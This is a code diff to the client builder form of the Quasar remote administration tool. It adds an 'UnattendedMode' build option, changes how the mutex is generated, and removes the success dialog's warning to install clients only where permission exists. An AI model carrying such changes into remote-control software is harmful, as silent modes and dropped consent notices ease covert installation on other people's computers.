@@ -1,6 +1,6 @@
-﻿using Quasar.Common.Helpers;
+﻿using Quasar.Common.DNS;
+using Quasar.Common.Helpers;
 using Quasar.Server.Build;
-using Quasar.Server.Helper;
 using Quasar.Server.Models;
 using System;
 using System.Collections.Generic;
@@ -11,7 +11,6 @@ using System.Linq;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
-using Quasar.Common.DNS;
 
 namespace Quasar.Server.Forms
 {
@@ -38,6 +37,7 @@ namespace Quasar.Server.Forms
             txtTag.Text = profile.Tag;
             numericUpDownDelay.Value = profile.Delay;
             txtMutex.Text = profile.Mutex;
+            chkUnattendedMode.Checked = profile.UnattendedMode;
             chkInstall.Checked = profile.InstallClient;
             txtInstallName.Text = profile.InstallName;
             GetInstallPath(profile.InstallPath).Checked = true;
@@ -72,6 +72,7 @@ namespace Quasar.Server.Forms
             profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
             profile.Delay = (int) numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
+            profile.UnattendedMode = chkUnattendedMode.Checked;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallName.Text;
             profile.InstallPath = GetInstallPath();
@@ -184,7 +185,7 @@ namespace Quasar.Server.Forms
         {
             HasChanged();
 
-            txtMutex.Text = StringHelper.GetRandomMutex();
+            txtMutex.Text = Guid.NewGuid().ToString();
         }
 
         private void chkInstall_CheckedChanged(object sender, EventArgs e)
@@ -256,6 +257,7 @@ namespace Quasar.Server.Forms
 
             options.Tag = txtTag.Text;
             options.Mutex = txtMutex.Text;
+            options.UnattendedMode = chkUnattendedMode.Checked;
             options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
             options.Delay = (int) numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
@@ -385,7 +387,7 @@ namespace Quasar.Server.Forms
                     this.Invoke((MethodInvoker) delegate
                     {
                         MessageBox.Show(this,
-                            $"Successfully built client!\nSaved to: {options.OutputPath}\n\nOnly install it on computers where you have the permission to do so!",
+                            $"Successfully built client! Saved to:\\{options.OutputPath}",
                             "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     });
                 }
